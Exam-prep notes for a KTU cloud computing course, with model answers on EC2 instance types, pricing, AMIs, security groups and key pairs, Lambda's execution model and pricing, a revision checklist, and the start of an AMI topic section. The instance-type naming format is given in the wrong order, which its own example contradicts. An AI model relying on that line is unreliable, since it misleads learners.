**(a)** Explain Amazon EC2 in detail, covering instance types, pricing models, and the role of AMIs, Security Groups, and Key Pairs. **(7 marks)**

**(b)** Discuss AWS Lambda as a serverless compute service. Explain its execution model, pricing, and compare it with EC2 for an event-driven workload. **(7 marks)**

---

#### **Model Solution for (a) — 7 Marks**

**1. EC2 Overview (1 mark):**
Amazon EC2 (Elastic Compute Cloud) provides **resizable virtual servers (instances)** in the cloud. It is the IaaS (Infrastructure-as-a-Service) backbone of AWS.

**2. Instance Types (2 marks):**
EC2 instance types follow the format `[Family][Size][Generation]` — e.g., `m5.large`.

| Family | Use Case |
|--------|----------|
| **T** (Burstable) | Variable workloads — dev/test, small web |
| **M** (General) | Balanced — app servers, microservices |
| **C** (Compute) | CPU-intensive — batch, gaming servers |
| **R/X** (Memory) | RAM-intensive — in-memory DB, SAP HANA |
| **P/G** (GPU/Graphics) | ML training, 3D rendering |

**3. Pricing Models (2 marks):**
- **On-Demand** — Pay per hour/second, no commitment.
- **Reserved Instances (RI)** — 1- or 3-year commitment, up to **75% discount**.
- **Savings Plans** — Flexible 1- or 3-year compute spend commitment, up to **72% discount**.
- **Spot Instances** — Bid on spare capacity, up to **90% discount**, can be reclaimed.
- **Dedicated Hosts** — Physical server for compliance/BYOL.

**4. Key EC2 Components (2 marks):**
- **AMI (Amazon Machine Image):** Template containing OS, applications, and config.
- **Security Group:** Stateful virtual firewall controlling inbound/outbound traffic at the **instance level**.
- **Key Pair:** RSA public-private key pair for SSH (Linux) or RDP (Windows) authentication. Public key stored by AWS; private key kept by user.

---

#### **Model Solution for (b) — 7 Marks**

**1. Lambda Overview (1 mark):**
AWS Lambda is a **serverless, event-driven compute service** that runs code in response to triggers without provisioning or managing servers. You upload code; AWS handles everything else.

**2. Execution Model (2 marks):**
Lambda follows this lifecycle:
1. **Trigger** (Event source) — API Gateway, S3, SQS, DynamoDB Streams, EventBridge, schedule.
2. **Cold start** — AWS allocates a runtime container (~200–500 ms first-time cost).
3. **Warm execution** — Subsequent invocations reuse the container (<10 ms).
4. **Billing** — Per millisecond of execution time + number of requests.
5. **Logging** — Output to Amazon CloudWatch Logs.

Lambda limits:
- Max execution: **15 minutes** (900 sec)
- Memory: **128 MB – 10,240 MB**
- Deployment package: **50 MB (zipped)**, **250 MB (unzipped)**

**3. Lambda Pricing (1.5 marks):**
$$
\text{Cost} = (\text{Requests} \times \$0.20/\text{M}) + (\text{GB-sec} \times \$0.0000166667)
$$

**Free tier:** 1M requests/month + 400,000 GB-seconds/month.

**4. Lambda vs EC2 Comparison (2.5 marks):**

| Criterion | Lambda | EC2 |
|-----------|:---:|:---:|
| Server management | None | Full |
| Max execution time | 15 min | Unlimited |
| Scaling | Automatic, instant | Manual / Auto Scaling Group |
| Pricing granularity | Per ms | Per hour/second |
| Cold start penalty | Yes | No |
| Persistent connections | ❌ | ✅ |
| Custom OS / runtime | ❌ | ✅ |
| Best for | Bursty, event-driven | Long-running, stateful |

**Conclusion:** Lambda is ideal for **event-driven, short-lived, stateless** workloads (image processing, REST APIs, scheduled jobs). EC2 is better for **long-running, stateful, or specialized** workloads (databases, custom HPC).

---

## 🔁 Topic Recap & Important Things to Remember

> [!TIP]
> **Last-Minute Revision Checklist for KTU 2024 Exam**

### ✅ Physical Security
- [ ] 6 layers of physical security (Perimeter → Building → Server Room → Rack → Environmental → Media)
- [ ] AWS data centers are **undisclosed** and use **biometric access**
- [ ] **Tier IV** data centers offer **99.995%** uptime
- [ ] Physical security is the **root of trust** — bypass of physical = bypass of all

### ✅ Identity & Access Management (IAM)
- [ ] IAM has **4 core building blocks**: Users, Groups, Roles, Policies
- [ ] **Roles** = temporary credentials; **Users** = permanent credentials
- [ ] Policy Evaluation: **Explicit Deny > Default Deny > Allow**
- [ ] Policy JSON elements: `Version`, `Statement`, `Effect`, `Action`, `Resource`, `Condition`
- [ ] MFA = two of: Knowledge, Possession, Inheritance
- [ ] AWS recommends **no root API keys** — use IAM users/roles

### ✅ AWS Global Infrastructure
- [ ] **Region** = Geographic area (e.g., `us-east-1`) — 33+
- [ ] **Availability Zone (AZ)** = 1+ data centers within a region — 100+ AZs
- [ ] **Edge Location** = CDN endpoint — 600+ PoPs
- [ ] **Multi-AZ** for HA, **Multi-Region** for DR
- [ ] AZs are connected via **<2 ms** private fiber

### ✅ AWS Compute Services
- [ ] **EC2** = IaaS virtual machines (full control)
- [ ] **Lambda** = Serverless FaaS (max 15 min, 10 GB RAM)
- [ ] **ECS / EKS** = Container orchestration (EKS = K8s)
- [ ] **Fargate** = Serverless containers (no EC2 management)
- [ ] **Elastic Beanstalk** = PaaS for code upload
- [ ] EC2 pricing: On-Demand, RI, Savings Plans, Spot, Dedicated Host
- [ ] Spot = up to 90% discount (can be reclaimed)

### ✅ Shared Responsibility
- [ ] AWS = "Security **OF** the Cloud" (physical, host, network)
- [ ] Customer = "Security **IN** the Cloud" (data, IAM, OS, app)
- [ ] Responsibility **shifts** depending on service (IaaS vs PaaS vs SaaS)

### ✅ High-Yield Numerical Facts
- [ ] Lambda: **15 min** max, **10 GB** max memory
- [ ] EC2 spot: up to **90%** discount
- [ ] EC2 RI: up to **75%** discount (1- or 3-year)
- [ ] S3 Glacier retrieval: minutes to hours
- [ ] Multi-AZ availability formula: $1 - (1 - a)^N$

### ✅ Common KTU 2024 Exam Keywords (Use These Verbatim!)
- *Defense in depth*, *Shared Responsibility Model*, *Least Privilege Principle*
- *Multi-AZ deployment*, *High Availability (HA)*, *Disaster Recovery (DR)*
- *Root of Trust*, *Tamper-evident*, *Biometric access control*
- *Event-driven computing*, *Cold start*, *Serverless*, *Burst pricing*

> [!WARNING]
> **Final Examiner Warning:** In KTU 2024 Scheme, you MUST explicitly mention **KTU syllabus terminology** (e.g., "as per the shared responsibility model", "physical security forms the root of trust"). Examiners award bonus marks for syllabus-aligned phrasing. Avoid colloquial terms like "AWS keeps things safe" — instead, write "AWS is responsible for the underlying infrastructure, while the customer secures the data and access."

---

**🏁 End of Module 4 Notes — Security of Physical Systems, IAM Access Control, AWS Ecosystem & Computing Services**

topics.title: Amazon Machine Images
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PEERT524 - CLOUD COMPUTING
> - **Module:** Module 4
> - **Topic:** Amazon Machine Images

<!-- SECTION_1_START -->
# SECTION 1: Core Technical Definition & Intuitive Overview

## 1.1 Formal Academic Definition

> [!NOTE]
> **Amazon Machine Image (AMI)** is a **read-only, pre-configured template** that contains the software configuration (operating system, application server, middleware, and applications) required to launch an Amazon EC2 instance. An AMI essentially functions as a **virtual appliance blueprint** — it packages the root volume template, launch permissions, and block device mappings that dictate what storage volumes are attached to the instance upon boot.

In KTU 2024 Scheme Cloud Computing terminology, an AMI is treated as one of the **three foundational pillars of EC2 provisioning**, alongside **Instance Type** (hardware capacity) and **Key Pair** (secure access). The AMI is what determines the *software personality* of any cloud virtual machine.

### 1.2 Conceptual Analogy — "The Bakery Mould"

> [!IMPORTANT]
> **Real-World Analogy:** Think of an AMI like a **bakery mould or cookie cutter**.
> - The **mould (AMI)** defines the exact shape, size, and design of the cookie.
> - Every time you press the mould into dough, you get an **identical cookie (EC2 instance)**.
> - The **dough** is the cloud's elastic compute capacity.
> - You can use the **same mould** to bake hundreds of cookies in the same kitchen (single region) or send the mould to another bakery across the world (cross-region copy).
> - If the mould is no longer useful, you **destroy the mould (deregister the AMI)** but the cookies already baked (running instances) continue to exist independently.

This analogy is critical for KTU viva questions — examiners often ask students to *"explain AMI to a non-technical stakeholder."*

### 1.3 The Three Core Constituents of an AMI

| # | Constituent | Role | Mandatory? |
|---|-------------|------|------------|
| 1 | **Root Volume Template** | OS + boot filesystem snapshot (EBS snapshot or instance store template) | Yes |
| 2 | **Launch Permissions** | Defines *which AWS accounts* may launch the AMI | Yes |
| 3 | **Block Device Mapping** | Specifies the *EBS volumes* and *instance store volumes* to attach on launch | Yes |

### 1.4 Region-Bound Identity

> [!WARNING]
> An AMI is **region-specific**. An `ami-0abc123` identifier in `us-east-1` is a **completely different entity** from `ami-0abc123` in `ap-south-1`. To use an AMI in another region, you must explicitly **copy** it. This is a common KTU exam pitfall — students often assume AMIs are globally unique.
